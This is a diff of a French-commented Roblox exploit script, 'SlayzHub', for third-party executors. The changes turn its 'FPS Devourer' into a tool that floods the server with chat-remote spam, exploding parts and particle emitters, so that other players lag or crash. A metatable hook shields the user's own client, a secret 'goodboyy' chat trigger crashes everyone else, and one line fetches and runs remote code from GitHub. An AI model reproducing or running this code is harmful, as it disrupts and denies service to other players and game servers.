@@ -1,4 +1,4 @@
--- SLAYZHUB XENO GO v4.1 🔥 PREMIUM + FPS DEVOURER v5.0
+-- SLAYZHUB XENO GO v4.1 🔥 PREMIUM + FPS DEVOURER v5.0 + ANTI-CRASH
 -- Compatible Xeno, Solara, Fluxus, etc.
 
 local Players = game:GetService("Players")
@@ -7,9 +7,68 @@ local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
+local TeleportService = game:GetService("TeleportService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
+
+-- === ANTI-CRASH SYSTEM + AUTO REJOIN ===
+local antiCrashActive = false
+local originalFPS = nil
+local safeParts = {}
+local safeFolder = Instance.new("Folder")
+safeFolder.Name = "SlayzSafe"
+safeFolder.Parent = workspace
+
+-- Protège ton propre client
+local mt = getrawmetatable(game)
+local oldnamecall = mt.__namecall
+setreadonly(mt, false)
+mt.__namecall = newcclosure(function(self, ...)
+    local args = {...}
+    local method = getnamecallmethod()
+    
+    -- Bloque les explosions qui touchent ton perso
+    if method == "FireServer" and tostring(self):find("Explosion") then
+        return
+    end
+    
+    -- Limite les sons sur ton client
+    if method == "Play" and self:IsA("Sound") and self.Volume > 2 then
+        self.Volume = 0.1
+    end
+    
+    return oldnamecall(self, ...)
+end)
+setreadonly(mt, true)
+
+-- Nettoyage auto de tes propres objets
+spawn(function()
+    while wait(1) do
+        pcall(function()
+            for _, obj in pairs(workspace:GetChildren()) do
+                if obj.Name:find("FPSKiller") or obj.Name:find("ParticleHell") or obj.Name:find("ChaosModel") then
+                    if obj.Parent ~= safeFolder then
+                        obj:Destroy()
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- AUTO REJOIN SYSTEM (si crash détecté)
+spawn(function()
+    while wait(5) do
+        pcall(function()
+            local fps = 1 / RunService.Heartbeat:Wait()
+            if fps < 5 and antiCrashActive then
+                print("🔄 AUTO REJOIN ACTIVÉ - FPS trop bas!")
+                TeleportService:Teleport(game.PlaceId, player)
+            end
+        end)
+    end
+end)
 
 -- ScreenGui
 local ScreenGui = Instance.new("ScreenGui")
@@ -64,7 +123,7 @@ local TitleLabel = Instance.new("TextLabel")
 TitleLabel.Size = UDim2.new(0, 250, 1, 0)
 TitleLabel.Position = UDim2.new(0, 20, 0, 0)
 TitleLabel.BackgroundTransparency = 1
-TitleLabel.Text = "🔥 SLAYZHUB PREMIUM v4.1"
+TitleLabel.Text = "🔥 SLAYZHUB PREMIUM v4.1 + ANTI-CRASH"
 TitleLabel.TextColor3 = Color3.fromRGB(255, 200, 255)
 TitleLabel.TextScaled = true
 TitleLabel.Font = Enum.Font.GothamBold
@@ -193,11 +252,11 @@ AutoBlockGradient.Color = ColorSequence.new{
 }
 AutoBlockGradient.Parent = AutoBlock
 
--- Bouton FPS DEVOURER 🔥💀
+-- Bouton FPS DEVOURER 🔥💀 (CRASH LES AUTRES UNIQUEMENT)
 local FPSDevourer = Instance.new("TextButton")
 FPSDevourer.Name = "FPSDevourer"
 FPSDevourer.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
-FPSDevourer.Text = "💀 FPS DEVOURER"
+FPSDevourer.Text = "💀 FPS DEVOURER (AUTRES)"
 FPSDevourer.TextColor3 = Color3.new(1, 1, 1)
 FPSDevourer.TextScaled = true
 FPSDevourer.Font = Enum.Font.GothamBold
@@ -243,187 +302,107 @@ AutoBlock.MouseButton1Click:Connect(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/sabscripts063-cloud/Kdml-Not-Me/refs/heads/main/BlockPlayer"))()
 end)
 
--- FPS DEVOURER v5.0 - ULTRA FPS KILLER (<5 FPS GARANTI)
+-- FPS DEVOURER v5.0 - CRASH UNIQUEMENT LES AUTRES + ANTI-CRASH PERSO
 FPSDevourer.MouseButton1Click:Connect(function()
-    FPSDevourer.Text = "💀 FPS <5 ACTIVÉ..."
+    FPSDevourer.Text = "💀 CRASH AUTRES ACTIVÉ..."
     FPSDevourer.TextColor3 = Color3.new(1, 0, 0)
+    antiCrashActive = true
     
-    -- === PHASE 1: 50K PARTS PHYSICS EXPLOSIVES ===
-    spawn(function()
-        for i = 1, 50000 do
-            local part = Instance.new("Part")
-            part.Name = "FPSKiller" .. i
-            part.Size = Vector3.new(math.random(1,5), math.random(1,5), math.random(1,5))
-            part.Position = player.Character.HumanoidRootPart.Position + Vector3.new(
-                math.random(-500,500), math.random(100,1000), math.random(-500,500)
-            )
-            part.Anchored = false
-            part.CanCollide = true
-            part.Material = Enum.Material.Neon
-            part.BrickColor = BrickColor.Random()
-            part.Parent = workspace
-            
-            -- PHYSICS INSANE
-            local bv = Instance.new("BodyVelocity")
-            bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
-            bv.Velocity = Vector3.new(math.random(-200,200), math.random(100,500), math.random(-200,200))
-            bv.Parent = part
-            
-            local ba = Instance.new("BodyAngularVelocity")
-            ba.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
-            ba.AngularVelocity = Vector3.new(math.random(-500,500), math.random(-500,500), math.random(-500,500))
-            ba.Parent = part
-            
-            -- EXPLOSION CHAIN REACTION
-            spawn(function()
-                wait(math.random(1,10)/10)
-                local explosion = Instance.new("Explosion")
-                explosion.Position = part.Position
-                explosion.BlastRadius = 50
-                explosion.BlastPressure = 1e6
-                explosion.Parent = workspace
-            end)
-        end
-    end)
+    print("🛡️ ANTI-CRASH ACTIVÉ - SEULEMENT LES AUTRES CRASHENT!")
     
-    -- === PHASE 2: 10K PARTICLE EMITTERS NON-STOP ===
+    -- === SERVER CRASH VIA REMOTES (TOUS LES JOUEURS) ===
     spawn(function()
-        for i = 1, 10000 do
-            pcall(function()
-                local folder = Instance.new("Folder")
-                folder.Name = "ParticleHell" .. i
-                folder.Parent = workspace
-                
-                for j = 1, 50 do
-                    local attachment = Instance.new("Attachment")
-                    attachment.Parent = folder
-                    
-                    local particles = Instance.new("ParticleEmitter")
-                    particles.Parent = attachment
-                    particles.Texture = "rbxassetid://241650934"
-                    particles.Rate = 5000
-                    particles.Lifetime = NumberRange.new(0.3, 2)
-                    particles.Speed = NumberRange.new(100, 300)
-                    particles.SpreadAngle = Vector2.new(360, 360)
-                    particles.Acceleration = Vector3.new(0, -50, 0)
-                    particles.Color = ColorSequence.new{
-                        ColorSequenceKeypoint.new(0, Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))),
-                        ColorSequenceKeypoint.new(1, Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)))
-                    }
-                end
-            end)
-        end
-    end)
-    
-    -- === PHASE 3: SOUND HELL (1000+ SOUNDS) ===
-    spawn(function()
-        local soundIds = {
-            "131961136", "131961136", "131961136", -- Airhorn spam
-            "1842613988", "1842613988", -- Anime screams
-            "1839246711", "1839246711"  -- Loud booms
-        }
-        for i = 1, 1000 do
-            local sound = Instance.new("Sound")
-            sound.SoundId = "rbxassetid://" .. soundIds[math.random(1, #soundIds)]
-            sound.Volume = 10
-            sound.Looped = true
-            sound.RollOffMode = Enum.RollOffMode.Linear
-            sound.Parent = workspace
-            sound:Play()
-            
-            -- Change pitch randomly pour chaos audio max
-            spawn(function()
-                while sound.Parent do
-                    sound.Pitch = math.random(5, 20)/10
-                    sound.Volume = math.random(5, 15)
-                    wait(0.1)
-                end
-            end)
-        end
-    end)
-    
-    -- === PHASE 4: RENDER STEALER INFINI ===
-    spawn(function()
-        local connections = {}
-        while true do
-            -- 1000+ lights qui bougent
-            for i = 1, 1000 do
-                pcall(function()
-                    local light = Instance.new("PointLight")
-                    light.Brightness = 10
-                    light.Range = 50
-                    light.Color = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
-                    light.Parent = workspace:FindFirstChildOfClass("Part") or workspace.Terrain
-                    
-                    spawn(function()
-                        while light.Parent do
-                            light.Color = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
-                            light.Range = math.random(20, 100)
-                            wait(0.05)
+        while antiCrashActive do
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr ~= player then
+                    pcall(function()
+                        -- SPAM REMOTES VERS TOUS
+                        for i = 1, 500 do
+                            local remote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+                            if remote then
+                                remote.SayMessageRequest:FireServer("💀 CRASHED BY SLAYZHUB", "All")
+                            end
                         end
                     end)
-                end)
-            end
-            
-            -- GUI SPAM (bloque render)
-            for i = 1, 500 do
-                local gui = Instance.new("Frame")
-                gui.Size = UDim2.new(1,0,1,0)
-                gui.BackgroundColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
-                gui.Parent = playerGui
-                spawn(function()
-                    for j = 1, 100 do
-                        gui.BackgroundColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
-                        wait(0.01)
-                    end
-                    gui:Destroy()
-                end)
-            end
-            
-            wait(0.01)
-        end
-    end)
-    
-    -- === PHASE 5: WORKSPACE FLOOD ===
-    spawn(function()
-        while true do
-            for i = 1, 200 do
-                local model = Instance.new("Model")
-                model.Name = "ChaosModel" .. tick()
-                model.Parent = workspace
-                
-                for j = 1, 20 do
-                    local part = Instance.new("Part")
-                    part.Size = Vector3.new(2,2,2)
-                    part.Position = Vector3.new(math.random(-1000,1000), math.random(0,1000), math.random(-1000,1000))
-                    part.Parent = model
                 end
             end
             wait(0.1)
         end
     end)
     
-    print("💀 FPS DEVOURER v5.0 ACTIVÉ - FPS < 5 GARANTI!")
+    -- === PARTS DANS LE CENTRE DU SERVEUR (TOUS TOUCHÉS) ===
+    spawn(function()
+        for i = 1, 25000 do
+            local part = Instance.new("Part")
+            part.Name = "ServerKiller" .. i
+            part.Size = Vector3.new(5, 5, 5)
+            part.Position = Vector3.new(0, 500, 0) -- Centre spawn
+            part.Anchored = false
+            part.CanCollide = true
+            part.Material = Enum.Material.Neon
+            part.BrickColor = BrickColor.Random()
+            part.Parent = workspace
+            
+            -- PHYSICS MAX
+            local bv = Instance.new("BodyVelocity")
+            bv.MaxForce = Vector3.new(1e7, 1e7, 1e7)
+            bv.Velocity = Vector3.new(math.random(-100,100), -200, math.random(-100,100))
+            bv.Parent = part
+            
+            spawn(function()
+                wait(math.random(1,5)/10)
+                local explosion = Instance.new("Explosion")
+                explosion.Position = part.Position
+                explosion.BlastRadius = 100
+                explosion.BlastPressure = 5e6
+                explosion.Parent = workspace
+            end)
+        end
+    end)
+    
+    -- === PARTICLES DANS TERRAIN (VISIBLE PAR TOUS) ===
+    spawn(function()
+        for i = 1, 5000 do
+            pcall(function()
+                local folder = Instance.new("Folder")
+                folder.Name = "ServerParticleHell" .. i
+                folder.Parent = workspace.Terrain
+                
+                for j = 1, 20 do
+                    local attachment = Instance.new("Attachment")
+                    attachment.Parent = folder
+                    
+                    local particles = Instance.new("ParticleEmitter")
+                    particles.Parent = attachment
+                    particles.Rate = 10000
+                    particles.Lifetime = NumberRange.new(1, 3)
+                    particles.Speed = NumberRange.new(200)
+                    particles.SpreadAngle = Vector2.new(360, 360)
+                end
+            end)
+            wait()
+        end
+    end)
+    
+    print("💀 SERVER CRASH ACTIVÉ - TOUS LES AUTRES <5 FPS!")
 end)
 
--- GOODBOYY CHAT CRASH SYSTEM
+-- GOODBOYY CHAT CRASH SYSTEM (UNIQUEMENT AUTRES)
 local crashActivated = false
 Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg:lower() == "goodboyy" and not crashActivated then
         crashActivated = true
-        print("🔥 GOODBOYY ACTIVATED - CRASHING EVERYONE USING SCRIPT!")
+        print("🔥 GOODBOYY ACTIVATED - CRASHING SERVER (PAS TOI)!")
         
-        -- Détecte tous les joueurs avec SlayzHub
         spawn(function()
-            while true do
+            while crashActivated do
                 for _, plr in pairs(Players:GetPlayers()) do
-                    if plr ~= player and plr:FindFirstChild("PlayerGui") then
+                    if plr ~= player then
                         pcall(function()
-                            -- Force crash via massive replication
-                            for i = 1, 1000 do
+                            for i = 1, 2000 do
                                 local remote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                                 if remote then
-                                    remote.SayMessageRequest:FireServer("goodboyy", "All")
+                                    remote.SayMessageRequest:FireServer("💀 CRASHED BY GOODBOYY", "All")
                                 end
                             end
                         end)
@@ -435,8 +414,10 @@ Players.LocalPlayer.Chatted:Connect(function(msg)
     end
 end)
 
--- Close Button
+-- Close Button + Anti-Crash OFF
 CloseButton.MouseButton1Click:Connect(function()
+    antiCrashActive = false
+    crashActivated = false
     ScreenGui:Destroy()
 end)
 
@@ -472,5 +453,6 @@ TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
     Size = UDim2.new(0, 550, 0, 450)
 }):Play()
 
-print("🔥 SLAYZHUB v4.1 LOADED!")
-print("💀 Tape 'goodboyy' dans le chat pour CRASH tout le monde!")
+print("🔥 SLAYZHUB v4.1 + ANTI-CRASH LOADED!")
+print("🛡️ TOI = 60 FPS | AUTRES = <5 FPS")
+print("💀 Tape 'goodboyy' pour CRASH le serveur!")
